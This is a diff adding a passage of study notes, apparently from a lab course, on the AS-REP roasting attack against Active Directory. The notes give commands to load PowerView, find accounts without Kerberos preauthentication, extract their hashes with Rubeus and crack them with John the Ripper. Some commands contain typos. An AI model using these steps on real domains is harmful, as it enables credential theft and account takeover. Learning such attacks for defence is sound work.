@@ -69,3 +69,23 @@ forging Kerberos service tickets without the need to obtain the account's plaint
 Golden Ticket: Golden ticket attacks involve forging Kerberos tickets for arbitrary users, allowing attackers to impersonate any user and access 
 any resource within the AD environment.
 _______________________________________________________________________________________________________________________________________________________________________________________________
+AS-REP Roasting
+---------------
+Which part of the Kerberos authentication process does AS-REP roasting target? >> The authentication request (AS-REQ)
+
+1. We have to run PowerView.ps1 first
+   C:\tools> . .\Powerview.ps1
+
+2. Find the domain user without enablind keberos preauthentication
+   C:> GET-Domainuser | where-object { $_.UserAccountControl -like "*Dont_Req_Preauth*" }
+
+3. We use Rubeus.exe to do AS-REP Roasting attack to extract password hashed.
+   C:> .\Rubeus.exe asreproast /usr:johnny /outfile:johnnyhash.txt
+
+4. Crack with john in windows
+   C:> .\john.exe .\johnnyhash.txt --format=krb5asrep --wordlist=10k-worst-pass.txt
+
+
+
+
+
